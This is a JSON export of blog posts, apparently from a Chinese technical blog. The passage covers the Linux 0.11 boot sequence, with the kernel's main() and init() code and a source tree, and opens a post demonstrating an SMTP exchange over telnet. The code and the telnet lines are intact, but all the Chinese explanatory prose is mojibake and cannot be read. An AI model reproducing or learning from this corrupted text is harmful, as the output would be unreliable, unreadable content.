ä¸­æ–­å‘é‡è¿˜æ˜¯ä¿æŠ¤æ¨¡å¼ä¸‹ä½¿ç”¨çš„ä¸­æ–­æè¿°ç¬¦è¡¨ï¼Œéƒ½ä¸è¿‡æ˜¯è®°å½•äº†ä¸€ä¸‹ä¸­æ–­å¤„ç†ä»£ç çš„ä½ç½®ï¼Œè¿›è¡Œäº†å®šä½è€Œå·²)ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eåˆå§‹åŒ–åˆ†é¡µæ¨¡å¼(ä¸è¯¦è¿°ï¼Œä»¥åæœ‰æœºä¼šåœ¨è¯´)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eéªŒè¯ 80387 æ•°å­¦åå¤„ç†å™¨ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eè¿›å…¥ main.c ç¨‹åº (æ—¢ç„¶ Linus éƒ½å°†å…¶å‘½åä¸º main äº†ï¼Œé‚£ä¹ˆæ˜¾ç„¶è¿™æ˜¯æ•´ä¸ªæ“ä½œç³»ç»Ÿæœ€æ ¸å¿ƒçš„éƒ¨åˆ†äº†)ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003emain.c\u003c/h3\u003e\n\u003cp\u003eä¸‹é¢å°†ç®€å•ç»™å‡º main.c ç¨‹åºçš„ä¸¤æ®µä»£ç  \u003ccode\u003emain(...)\u003c/code\u003e å’Œ \u003ccode\u003einit(...)\u003c/code\u003eï¼Œå¹¶ç›´æ¥é’ˆå¯¹ä»£ç è¿›è¡Œç›´æ¥è§£é‡Šã€‚\u003c/p\u003e\n\u003ch4\u003emain(void)\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003evoid main(void)     \n{\n    ROOT_DEV = ORIG_ROOT_DEV;   // è¯»å–åœ¨å¼•å¯¼ç¨‹åºæ‰§è¡Œæ—¶è·å–åˆ°çš„æ–‡ä»¶ç³»ç»Ÿæ‰€åœ¨çš„ç£ç›˜\n    drive_info = DRIVE_INFO;\n    memory_end = (1\u0026#x3C;\u0026#x3C;20) + (EXT_MEM_K\u0026#x3C;\u0026#x3C;10); // é¦–å…ˆå…ˆç¡®è®¤æ•´ä¸ªå†…å­˜çš„å¤§å°\n    memory_end \u0026#x26;= 0xfffff000;               // å½“ç„¶ï¼Œè¿™é‡Œä¸ºäº†åˆ†é¡µæ–¹ä¾¿ (æ¯é¡µ 4096 B)ï¼Œç›´æ¥å°†ä¸æ»¡ä¸€é¡µçš„å†…å­˜å¿½ç•¥æ‰äº†\n    if (memory_end \u003e 16*1024*1024)          // æœ€å¤§æ”¯æŒ 16 MB çš„å†…å­˜ï¼Œè¿™é‡Œæ˜¯ Linus å½“æ—¶çš„æœºå™¨åªæœ‰ 16 MBï¼Œå› æ­¤æ²¡æœ‰åšæ›´å¤§å†…å­˜çš„æ”¯æŒï¼Œä½†å¯ä»¥è‡ªå·±å»æ”¹æºç \n        memory_end = 16*1024*1024;\n    if (memory_end \u003e 12*1024*1024)          // ç¡®è®¤ç¼“å­˜åŒºçš„æœ«åœ°å€ (æ ¹æ®å®é™…å†…å­˜å¤§å°è°ƒæ•´, \u003e12MB ç•™ 4MB ç¼“å­˜ï¼Œ\u003e6MB ç•™ 2 MB ç¼“å­˜ï¼Œå¦åˆ™ 1MB )\n        buffer_memory_end = 4*1024*1024;\n    else if (memory_end \u003e 6*1024*1024)\n        buffer_memory_end = 2*1024*1024;\n    else\n        buffer_memory_end = 1*1024*1024;\n    main_memory_start = buffer_memory_end;\n#ifdef RAMDISK\n    main_memory_start += rd_init(main_memory_start, RAMDISK*1024);      // å¦‚æœéœ€è¦è™šæ‹Ÿç›˜ï¼Œåˆ™å†ç•™ä¸€éƒ¨åˆ†ä½œä¸ºäº¤æ¢åŒº\n#endif\n    mem_init(main_memory_start,memory_end); // å†…å­˜åˆå§‹åŒ–ï¼Œæ¯•ç«Ÿ Linux æ“ä½œç³»ç»Ÿä¸‹çš„æ‰€æœ‰å†…å­˜éƒ½å°†è¢«ç»Ÿä¸€åˆ†é…ï¼Œç”¨æˆ·ç¨‹åºæ²¡æœ‰æƒé™éšä¾¿ä½¿ç”¨å†…å­˜ï¼Œåªèƒ½ç”¨è¢«åˆ†é…çš„\n    trap_init();            // åˆå§‹åŒ–ä¸­æ–­\n    blk_dev_init();         // åˆå§‹åŒ–å—è®¾å¤‡\n    chr_dev_init();         // åˆå§‹åŒ–å­—ç¬¦è®¾å¤‡\n    tty_init();             // åˆå§‹åŒ– tty\n    time_init();            // è®¾ç½®å¼€æœºå¯åŠ¨æ—¶é—´\n    sched_init();           // åˆå§‹åŒ–ä»»åŠ¡è°ƒåº¦ç¨‹åºï¼Œç”±æ­¤å°±å°†å¯ä»¥è¿›è¡Œå¤šä»»åŠ¡åˆ‡æ¢äº†\n    buffer_init(buffer_memory_end); // ç¼“å­˜åŒºåˆå§‹åŒ–\n    hd_init();              // ç¡¬ç›˜åˆå§‹åŒ–\n    floppy_init();          // è½¯ç›˜åˆå§‹åŒ–\n    sti();                  // ä¸å†ç¦æ­¢ä¸­æ–­ï¼Œç°åœ¨å¼€å§‹åˆå…è®¸ä¸­æ–­äº†\n    move_to_user_mode();    // è¿›å…¥ç”¨æˆ·æ€\n    if (!fork()) {          // å…³äº fork å‡½æ•°ï¼Œä¸‹é¢å°†ç®€å•ä»‹ç»ã€‚\n        init();\n    }\n\n    for(;;) pause();\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003efork()\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eå¦‚æœç†Ÿæ‚‰ C è¯­è¨€ï¼Œåº”è¯¥å¯¹ fork() ä¹Ÿæ¯”è¾ƒç†Ÿæ‚‰å§ã€‚è¿™å°†æ‰§è¡Œä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼Œæœ€ç»ˆçš„ç»“æœæ˜¯ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ä»»åŠ¡ (è¿™é‡Œå°†åŸæ¥çš„æ“ä½œç³»ç»Ÿç¨‹åºè®¤ä¸ºæ˜¯ 0 å·è¿›ç¨‹/ä»»åŠ¡ï¼Œå°†äº§ç”Ÿ 1 å·è¿›ç¨‹/ä»»åŠ¡)ã€‚æ–°çš„ä»»åŠ¡ä¸åŸæœ‰ä»»åŠ¡å‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼Œé™¤äº† fork() è°ƒç”¨çš„è¿”å›å€¼ä¸åŒã€‚å­ä»»åŠ¡å°†è¿”å› 0 ï¼ŒåŸæœ‰ä»»åŠ¡å°†è¿”å›å­ä»»åŠ¡çš„ä»»åŠ¡å·ã€‚\u003c/p\u003e\n\u003cp\u003eå› æ­¤ï¼Œå¯¹äºä¸Šé¢çš„ä»£ç ï¼Œ\u003ccode\u003eif(!fork())\u003c/code\u003e ï¼Œ0å·ä»»åŠ¡å°†ä¸æ‰§è¡Œ \u003ccode\u003eif(){}\u003c/code\u003e è¯­å¥å—å†…çš„ init ï¼Œè€Œ 1 å·ä»»åŠ¡å°†æ‰§è¡Œ \u003ccode\u003einit()\u003c/code\u003e å‡½æ•°\u003c/p\u003e\n\u003cp\u003eè€Œ 0 å·è¿›ç¨‹åœ¨åšä»€ä¹ˆå‘¢? \u003c/p\u003e\n\u003cp\u003eå¾ˆç®€å•ï¼Œä¸‹é¢ \u003ccode\u003efor(;;) pause();\u003c/code\u003eã€‚ \u003ccode\u003epause()\u003c/code\u003e æ˜¯æŒ‡è®© CPU å®Œå…¨åœæ­¢ï¼Œåªæœ‰å‘ç”Ÿç¡¬ä»¶ä¸­æ–­ï¼Œ CPU æ‰ä¼šä»åœæ­¢çŠ¶æ€ä¸­æ¢å¤ (å‰é¢å·²ç»è®¾ç½®äº†å®šæ—¶çš„/ 10ms/æ¬¡çš„æ—¶é’Ÿä¸­æ–­ï¼Œå› æ­¤ CPU æ€»æ˜¯èƒ½å¤Ÿæ¢å¤)ï¼Œ \u003c/p\u003e\n\u003cp\u003eå…·ä½“çš„æè¿°å°±æ˜¯ï¼Œå¦‚æœä»»åŠ¡è°ƒåº¦ç¨‹åºæŠŠæ—¶é—´ç‰‡åˆ†é…ç»™äº† 0 å·è¿›ç¨‹ï¼Œé‚£ä¹ˆ 0 å·è¿›ç¨‹å”¯ä¸€åšçš„ï¼Œå°±æ˜¯è®© CPU åœæ­¢ã€‚è€Œä¸” 0 å·è¿›ç¨‹çš„ \u003ccode\u003efor\u003c/code\u003e æ˜¯æ­»å¾ªç¯ï¼Œæ¯æ¬¡æŠŠæ—¶é—´åˆ†é…ç»™ 0 å·è¿›ç¨‹ï¼Œå®ƒå°± CPU åœæ­¢ã€‚æˆ‘ä»¬åœ¨ Linux æ“ä½œç³»ç»Ÿä¸Šï¼Œé€šè¿‡ top å¯ä»¥çœ‹åˆ°å¯¹ cpu æœ‰å¦‚ä¸‹æè¿°\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,100.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå…¶ä¸­å¯¹ idle(id) çš„ç»Ÿè®¡ï¼Œå…¶å®å°±åœ¨ 0 å·ä»»åŠ¡è®© cpu åœæ­¢å·¥ä½œäº†è€Œå·²ã€‚\u003c/p\u003e\n\u003ch4\u003einit(void)\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003evoid init(void)\n{\n    int pid,i;\n\n    setup((void *) \u0026#x26;drive_info);\n    (void) open(\"/dev/tty0\",O_RDWR,0);\n    (void) dup(0);\n    (void) dup(0);\n    printf(\"%d buffers = %d bytes buffer space\\n\\r\",NR_BUFFERS,\n        NR_BUFFERS*BLOCK_SIZE);\n    printf(\"Free mem: %d bytes\\n\\r\",memory_end-main_memory_start);\n    if (!(pid=fork())) {\n        close(0);\n        if (open(\"/etc/rc\",O_RDONLY,0))\n            _exit(1);\n        execve(\"/bin/sh\",argv_rc,envp_rc);\n        _exit(2);\n    }\n    if (pid\u003e0)\n        while (pid != wait(\u0026#x26;i))\n            /* nothing */;\n    while (1) {\n        if ((pid=fork())\u0026#x3C;0) {\n            printf(\"Fork failed in init\\r\\n\");\n            continue;\n        }\n        if (!pid) {\n            close(0);close(1);close(2);\n            setsid();\n            (void) open(\"/dev/tty0\",O_RDWR,0);\n            (void) dup(0);\n            (void) dup(0);\n            _exit(execve(\"/bin/sh\",argv,envp));\n        }\n        while (1)\n            if (pid == wait(\u0026#x26;i))\n                break;\n        printf(\"\\n\\rchild %d died with code %04x\\n\\r\",pid,i);\n        sync();\n    }\n    _exit(0);   /* NOTE! _exit, not exit() */\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eé‚£ä¹ˆ 1 å·ä»»åŠ¡åœ¨åšä»€ä¹ˆå‘¢ï¼Ÿçœ‹ init çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å¤§é‡è¯¸å¦‚ \u003ccode\u003e/dev/tty0\u003c/code\u003e, \u003ccode\u003e/bin/sh\u003c/code\u003e çš„ä»£ç ã€‚å“ˆå“ˆï¼Œä¸‹é¢é€šè¿‡ 1,2,3... å¯¹æ­¥éª¤è¿›è¡Œæ ‡å·ç®€å•æè¿°ä¸€ä¸‹ã€‚\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e1 å·è¿›ç¨‹åœ¨åšçš„æ˜¯ fork å‡ºæ–°çš„è¿›ç¨‹(æš‚æ—¶å«å®ƒè¿›ç¨‹ X )\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e1 å·è¿›ç¨‹ä¸æ–­è¯¢é—® X æ˜¯å¦è¢«é”€æ¯ \u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eå¦‚æœ X è¿›ç¨‹è¢«é”€æ¯äº†ï¼šé‚£ä¹ˆç»§ç»­æ‰§è¡Œæ­¥éª¤ 1\u003c/li\u003e\n\u003cli\u003eå¦åˆ™ï¼šç»§ç»­æ‰§è¡Œæ­¥éª¤ 2 ï¼ˆä¸ºä»€ä¹ˆä¼šå‡ºç°ä¸æ–­å¾ªç¯å‘¢ï¼Ÿå…¶å®ç”±äºä»»åŠ¡è°ƒåº¦ç¨‹åºçš„å­˜åœ¨ï¼Œåœ¨å•ä¸ª CPU çœ‹æ¥ï¼Œè¿™ä¸ªè½®è¯¢å¹¶ä¸ä¸€ç›´å‘ç”Ÿï¼Œæœ‰ä¸€äº›æ—¶é—´ç‰‡å·²ç»ç»™äº†å…¶ä»–è¿›ç¨‹ç»§ç»­æ‰§è¡Œä»»åŠ¡äº†\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eX ä»»åŠ¡é€šè¿‡è°ƒç”¨ \u003ccode\u003eexecve()\u003c/code\u003e æŠŠå½“å‰ç¨‹åºçš„ä»£ç +æ•°æ®å…¨éƒ¨æ›¿æ¢æˆæ˜¯ shell çš„ (å…¶å®å¤§é‡çš„ç”¨æˆ·ç¨‹åºéƒ½æ˜¯é€šè¿‡è¿™ç§ fork + execve çš„å½¢å¼å‡ºç°çš„)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eX ä»»åŠ¡(ä¹Ÿå°±æ˜¯ Shell ç¨‹åº) å¼€å§‹é€šè¿‡ tty ä¸ç”¨æˆ·å¼€å§‹äº¤äº’ã€‚ç›´åˆ°ç”¨æˆ·é€‰æ‹© \u003ccode\u003eexit\u003c/code\u003e é€€å‡º shell \u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003eexecve(...)\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eå‰é¢ä»‹ç»è¿‡ fork æ˜¯å¤åˆ¶ä¸€ä»½ç¨‹åºçš„å„ä¸ªå¯„å­˜å™¨çš„çŠ¶æ€ + ç¨‹åºçš„æ•°æ®ã€‚ç°åœ¨ execve åšå‡ºçš„æ“ä½œæ˜¯ç›´æ¥å°†å½“å‰ç¨‹åºçš„ä»£ç å’Œæ•°æ®æ›¿æ¢æˆç›®æ ‡ç¨‹åºçš„ä»£ç å’Œæ•°æ®ï¼Œå¹¶é€šè¿‡å¯¹å¯„å­˜å™¨ä¸€å®šçš„é‡ç½®ï¼Œå®Œæˆä¸€ä¸ªç”¨æˆ·ç¨‹åºçš„å¯åŠ¨æµç¨‹(ç¨‹åºå¯åŠ¨è¯´åˆ°åº•ä¸å°±æ˜¯åœ¨å†…å­˜ä¸­å­˜åœ¨è¿™ä¸ªç¨‹åºçš„ä»£ç ï¼Œç„¶åé€šè¿‡ CS:IP å®šä½åˆ°å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤ï¼Œæœ€åè®© CPU å¼€å§‹æ‰§è¡Œå°± OK äº†)\u003c/p\u003e\n\u003ch2\u003eå°ç»“\u003c/h2\u003e\n\u003cp\u003eæ•´ä¸ªæ“ä½œç³»ç»Ÿçš„å¯åŠ¨æµç¨‹å°±ç®€å•åœ°ä»‹ç»åˆ°è¿™é‡Œã€‚\u003c/p\u003e\n\u003cp\u003e0 å·ä»»åŠ¡ä½œä¸ºæ“ä½œç³»ç»Ÿçš„å¸¸é©»ç¨‹åºï¼Œåœ¨ OS å¯åŠ¨å®Œæˆï¼Œæ¯æ¬¡æ—¶é—´ç‰‡è¢«åˆ†é…ç»™å®ƒï¼Œå®ƒå°±è®© CPU åœæ­¢å·¥ä½œ(é€šè¿‡ pause() ç³»ç»Ÿè°ƒç”¨)\u003c/p\u003e\n\u003cp\u003e1 å·ä»»åŠ¡ä½œä¸ºæ“ä½œç³»ç»Ÿçš„å¸¸é©»ç¨‹åºï¼Œå”¯ä¸€çš„ä»»åŠ¡å°±æ˜¯åˆ¤æ–­è¿›ç¨‹Xæ˜¯å¦è¢«é€€å‡ºï¼Œå¦‚æœé€€å‡ºäº†ï¼Œå°±é‡æ–°åˆ›å»ºä¸€ä¸ª(å½“ç„¶ï¼Œä¹Ÿå¯èƒ½æœ‰äººæœ‰ç–‘é—®ï¼Œä¸ºä»€ä¹ˆç°åœ¨çš„ Linux å¼€å¤šä¸ª bash éƒ½æ²¡æœ‰é—®é¢˜å‘¢? è¿™é‡Œæœ‰ä¸ªçŒœæµ‹æ˜¯æœ‰ä¸€ä¸ªéšè—çš„ shell æ˜¯è¢« 1 å·ä»»åŠ¡å¯åŠ¨çš„ï¼Œå…¶å®ƒçš„ bash æ˜¯å¤šä½™çš„ã€‚ä¸è¿‡è¿™åªæ˜¯çŒœæµ‹ï¼Œå¾…è€ƒå¯Ÿ)\u003c/p\u003e\n\u003ch2\u003eé™„å½•\u003c/h2\u003e\n\u003ch3\u003eé™„å½•ä¸€\u003c/h3\u003e\n\u003cpre\u003e\u003ccode\u003e.\n|-- Makefile\n|-- boot\n|   |-- head.s\n|-- fs\n|   |-- Makefile\n|   |-- bitmap.c\n|   |-- block_dev.c\n|   |-- buffer.c\n|   |-- char_dev.c\n|   |-- exec.c\n|   |-- fcntl.c\n|   |-- file_dev.c\n|   |-- file_table.c\n|   |-- inode.c\n|   |-- ioctl.c\n|   |-- namei.c\n|   |-- open.c\n|   |-- pipe.c\n|   |-- read_write.c\n|   |-- stat.c\n|   |-- super.c\n|   `-- truncate.c\n|-- include\n|   |-- a.out.h\n|   |-- asm\n|   |   |-- io.h\n|   |   |-- memory.h\n|   |   |-- segment.h\n|   |   `-- system.h\n|   |-- const.h\n|   |-- ctype.h\n|   |-- errno.h\n|   |-- fcntl.h\n|   |-- linux\n|   |   |-- config.h\n|   |   |-- fdreg.h\n|   |   |-- fs.h\n|   |   |-- hdreg.h\n|   |   |-- head.h\n|   |   |-- kernel.h\n|   |   |-- mm.h\n|   |   |-- sched.h\n|   |   |-- sys.h\n|   |   `-- tty.h\n|   |-- signal.h\n|   |-- stdarg.h\n|   |-- stddef.h\n|   |-- string.h\n|   |-- sys\n|   |   |-- stat.h\n|   |   |-- times.h\n|   |   |-- types.h\n|   |   |-- utsname.h\n|   |   `-- wait.h\n|   |-- termios.h\n|   |-- time.h\n|   |-- unistd.h\n|   `-- utime.h\n|-- init\n|   |-- main.c\n|-- kernel\n|   |-- Makefile\n|   |-- asm.o\n|   |-- asm.s\n|   |-- blk_drv\n|   |   |-- Makefile\n|   |   |-- blk.h\n|   |   |-- floppy.c\n|   |   |-- hd.c\n|   |   |-- ll_rw_blk.c\n|   |   `-- ramdisk.c\n|   |-- chr_drv\n|   |   |-- Makefile\n|   |   |-- console.c\n|   |   |-- keyboard.S\n|   |   |-- rs_io.s\n|   |   |-- serial.c\n|   |   |-- tty_io.c\n|   |   `-- tty_ioctl.c\n|   |-- exit.c\n|   |-- fork.c\n|   |-- fork.i\n|   |-- math\n|   |   |-- Makefile\n|   |   `-- math_emulate.c\n|   |-- mktime.c\n|   |-- panic.c\n|   |-- printk.c\n|   |-- sched.c\n|   |-- sched.o\n|   |-- signal.c\n|   |-- sys.c\n|   |-- system_call.o\n|   |-- system_call.s\n|   |-- traps.c\n|   |-- traps.o\n|   `-- vsprintf.c\n|-- lib\n|   |-- Makefile\n|   |-- _exit.c\n|   |-- close.c\n|   |-- ctype.c\n|   |-- dup.c\n|   |-- errno.c\n|   |-- execve.c\n|   |-- malloc.c\n|   |-- open.c\n|   |-- setsid.c\n|   |-- string.c\n|   |-- wait.c\n|   `-- write.c\n|-- mm\n|   |-- Makefile\n|   |-- memory.c\n|   `-- page.s\n`-- tools\n    `-- build.c\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"language-plain\"\u003e  __                    __                  \n / _| __ _ _ __   __ _ / _| ___ _ __   __ _ \n| |_ / _` | '_ \\ / _` | |_ / _ \\ '_ \\ / _` |\n|  _| (_| | | | | (_| |  _|  __/ | | | (_| |\n|_|  \\__,_|_| |_|\\__, |_|  \\___|_| |_|\\__, |\n                 |___/                |___/ \n\u003c/code\u003e\u003c/pre\u003e","digest":"\u003cp\u003eè¿™æ¬¡æ‹–å¾—æœ‰å¤Ÿä¹…çš„ï¼Œæ¯•ç«Ÿéœ€è¦å°†çŸ¥è¯†ä¸²è”èµ·æ¥å¹¶ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹æƒ…ã€‚æ›´ä½•å†µå¾ˆå¤šå†…å®¹å¯ä»¥è¯´å’Œå¸¸ç†(ä¸ªäººç†è§£çš„å¸¸ç†)æœ‰äº†æ¯”è¾ƒå¤§çš„åå·®ã€‚\u003c/p\u003e\n\u003cp\u003eä¸è¿‡ç¡®å®æ¯”è¾ƒæœ‰æ„æ€ã€‚ä»å¼•å¯¼ç¨‹åºåˆ°æ“ä½œç³»ç»Ÿå¯åŠ¨ï¼Œè¿™ä¸­é—´ç©¶ç«Ÿç»å†äº†å¤šå°‘æµç¨‹å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eç”±äºæœ‰äº†å‰å‡ èŠ‚çš„å†…å®¹ï¼Œè¿™é‡Œä¸ä¼šå†å¯¹å¼•å¯¼ç¨‹åºåŠæ±‡ç¼–è¯­æ³•åšè¿‡å¤šçš„ä»‹ç»ã€‚è€Œç€é‡åœ¨äºæ•´ä¸ªæµç¨‹çš„æè¿°ã€‚\u003c/p\u003e"},{"url":"2018-09-27-mail","fileName":"2018-09-27-mail.md","title":"Understand MAIL","author":"fangfeng","date":"2018-09-27T00:00:00.000Z","tags":["mail","SMTP","TCP"],"content":"\u003cp\u003eåœ¨ç½‘ç»œåè®®ä¸Šï¼Œé«˜å±‚åè®®ç¡®å®æ¯”åº•å±‚åè®®æ›´å®¹æ˜“ç†è§£ï¼Œä¹Ÿæ›´åŠ çš„äººæ€§åŒ–ã€‚\nä¼ è¾“å±‚çš„ TCP, UDP éƒ½è¿˜åœç•™åœ¨å„ç§å­—èŠ‚å†…å®¹çš„æ•´åˆå’Œæ ¡éªŒä¸Šï¼Œè€Œæ›´ä¸Šå±‚çš„åº”ç”¨å±‚åè®®å°±å·²ç»èƒ½å¤Ÿç›´è§‚åˆ°é€šè¿‡ç›´æ¥è§£è¯»å°±èƒ½ç†è§£å…¶æ¯æ¡æ¶ˆæ¯çš„å«ä¹‰äº†ã€‚\u003c/p\u003e\n\u003ch2\u003eSMTP åè®®\u003c/h2\u003e\n\u003cp\u003eSMTPï¼Œç®€å•é‚®ä»¶ä¼ è¾“åè®®ã€‚å•ä»åè®®å†…å®¹ä¸Šæ¥è¯´ç¡®å®æ²¡æœ‰å¤ªå¤šçš„å­¦ä¹ éš¾åº¦ã€‚ä½†æ˜¯ï¼Œæ‰­è½¬â€œå¸¸è¯†â€æ°æ°æ˜¯å·¨å¤§çš„ç»Šè„šçŸ³ã€‚\nç›´æ¥å°±è¿›å…¥äº†ç½‘é¡µé‚®ä»¶ç³»ç»Ÿ or å®¢æˆ·ç«¯é‚®ä»¶ç³»ç»Ÿçš„æ—¶ä»£ã€‚å›¾å½¢åŒ–çš„ç•Œé¢é…åˆä¸Šä¸€äº›å…³é”®å­—çš„å†…å®¹ (æ¯”å¦‚æ”¶ä»¶äººï¼Œä¸»é¢˜ç­‰)ã€‚\nç‚¹å‡»å‘é€å°±è§‰å¾—ä¸€å°é‚®ä»¶å·²ç»å‘å‡ºå»äº†ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œç©¶ç«Ÿè¿™ä¸­é—´åšäº†ä»€ä¹ˆå‘¢ï¼Ÿ\n163ï¼ŒGMAIL, QQ ç­‰é‚®ç®±ç©¶ç«Ÿåˆåœ¨å…¶ä¸­æ‰®æ¼”ç€æ€æ ·çš„ä¸€ä¸ªè§’è‰²ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆï¼ŒSMTP æ˜¯ä¸ºäº†é«˜æ•ˆã€å¯é åœ°ä¼ é€’é‚®ä»¶è€Œå­˜åœ¨çš„ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹é¢å…ˆç»™ä¸€æ®µæ¼”ç¤ºã€‚é€šè¿‡ telnet è¿æ¥åˆ° 183.57.48.34 (è¿™ä¸ªæ˜¯è…¾è®¯ä¼ä¸šé‚®å…¶ä¸­ä¸€å°æœºå™¨çš„ IP) 25 (SMTP æœåŠ¡ç«¯å£) ï¼Œä»¥æœ¬æœºä½œä¸º SMTP çš„å®¢æˆ·ç«¯ï¼Œè€Œå°† 183.XXX ä½œä¸º SMTP çš„æœåŠ¡ç«¯ï¼Œæ¥å®Œæˆé‚®ä»¶ä¿¡æ¯çš„ä¸€æ¬¡äº¤äº’ã€‚ (å½“ç„¶ï¼Œæœ€åå¤±è´¥äº†ã€‚è¢«ä¼ä¸šé‚®è¯†åˆ«ä¸ºåƒåœ¾é‚®ä»¶äº†...)\u003c/p\u003e\n\u003cp\u003eä¸‹åˆ—æ¯è¡Œ \u003ccode\u003e#\u003c/code\u003e å¼€å§‹åŠä¹‹åçš„å†…å®¹æ˜¯ä¸ªäººæ·»åŠ çš„æ³¨é‡Šï¼Œå…¶å®ƒå†…å®¹æ˜¯ telnet äº¤äº’çš„å†…å®¹ã€‚\nåŒæ—¶ï¼Œ\u003ccode\u003e--\u003c/code\u003e æ ‡å¿—è¯¥è¡Œå†…å®¹ç”±\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$ telnet 183.57.48.34 25\nTrying 183.57.48.34...\nConnected to 183.57.48.34.\nEscape character is '^]'.\n220 bizmx17.qq.com MX QQ Mail Server\nHELO test                               -- # MEANS HELLO \u0026#x3C;domain\u003e åœ¨æ¯æ¬¡å»ºç«‹è¿æ¥é€šé“åï¼Œå‘é€çš„ç¬¬ä¸€æ¡æ¶ˆæ¯\n250 bizmx17.qq.com                         # æœåŠ¡å™¨çš„å›å¤å€¼ Code 250 \nMAIL FROM: \u0026#x3C;from@test.net\u003e              -- # MAIL è¡¨ç¤ºé‚®ä»¶çš„å‘èµ·æ–¹ï¼Œç”¨äºé€€ä¿¡ç­‰å…¶ä»–é‚®ä»¶åå‘äº‹ä»¶\n250 Ok                                   \nRCPT TO: \u0026#x3C;to@xxx.xxx\u003e                   -- # RCPT è¡¨ç¤ºé‚®ä»¶çš„æ¥æ”¶æ–¹ï¼Œç”¨äºæŠ•é€’é‚®ä»¶ç­‰æ­£å‘äº‹ä»¶\n250 Ok\nDATA                                    -- # DATA è¡¨ç¤ºä¹‹åçš„å†…å®¹å°†ä½œä¸ºé‚®ä»¶æ­£æ–‡ (æ­£æ–‡è¿™ä¸ªæè¿°å¯èƒ½ä¸å¤ªæ°å½“ï¼Œæ›´åº”è¯¥æ˜¯ç­‰åŒäºä¿¡å°å†…çš„æ‰€æœ‰å†…å®¹)\n354 End data with \u0026#x3C;CR\u003e\u0026#x3C;LF\u003e.\u0026#x3C;CR\u003e\u0026#x3C;LF\u003e\n                                        --\nIt's a fake mail.                       -- # é‚®ä»¶æ­£æ–‡ï¼Œå…¶å®è¿˜å¯ä»¥å†™ä¸Šè¯¸å¦‚ 'Subject: XXX' 'Cc: XXX' çš„å†…å®¹\n.                                       -- # æ­£æ–‡å†…å®¹ç»“æŸçš„æ ‡å¿—ï¼Œ\u0026#x3C;CR\u003e\u0026#x3C;LF\u003e.\u0026#x3C;CR\u003e\u0026#x3C;LF\u003e\n550 Mail content denied. http://service.exmail.qq.com/cgi-bin/help?subtype=1\u0026#x26;\u0026#x26;id=20022\u0026#x26;\u0026#x26;no=1000726 # è¿™é‡Œå¾ˆæ— å¥ˆï¼Œæ²¡è…¾è®¯ç»™æ‹¦äº†ï¼Œæ²¡å‘å‡ºå»ã€‚ä¸è¿‡åæ­£æ˜¯å‡çš„ï¼Œé‚®ä»¶ä¿¡æ¯ä¸å…¨ã€‚\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eå‡ ä¸ªä¸»è¦çš„ SMTP äº¤äº’æŒ‡ä»¤\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eHELO: (HELLO)\nä¸»è¦ç”¨äºè®© SMTP æœåŠ¡å™¨å¯¹å½“å‰è¿æ¥çš„ SMTP å®¢æˆ·ç«¯(ä¸Šä¾‹æ˜¯ telnet æ¨¡æ‹Ÿçš„) å»ºç«‹ä¸€ä¸ªèº«ä»½æ ‡å¿— (ä¸€èˆ¬æ˜¯å½“å‰çš„ä¸»æœºå)\u003c/li\u003e\n\u003cli\u003eMAIL:\nç”¨æ³• MAIL FROM: \u003ca href=\"mailto:xx@xx.xx\"\u003exx@xx.xx\u003c/a\u003e (ä¸åŒºåˆ†å¤§å°å†™)\nå¯ä»¥å°†å…¶ä¸æ™®é€šä¿¡ä»¶çš„ä¿¡å°ç­‰åŒã€‚æ¯•ç«Ÿéƒ½æ˜¯è¦å†™ä¸Šå‘ä¿¡äººï¼Œå¦‚æœæ²¡äººæ”¶ä¿¡ï¼Œä¹Ÿå°±å¯ä»¥æ ¹æ®è¿™ä¸ªå£°æ˜å°†ä¿¡ä»¶é€€å›ã€‚\u003c/li\u003e\n\u003cli\u003eRCPT: (RECIPIENT)\nç”¨æ³• RCPT TO: \u003ca href=\"mailto:xx@xx.xx\"\u003exx@xx.xx\u003c/a\u003e 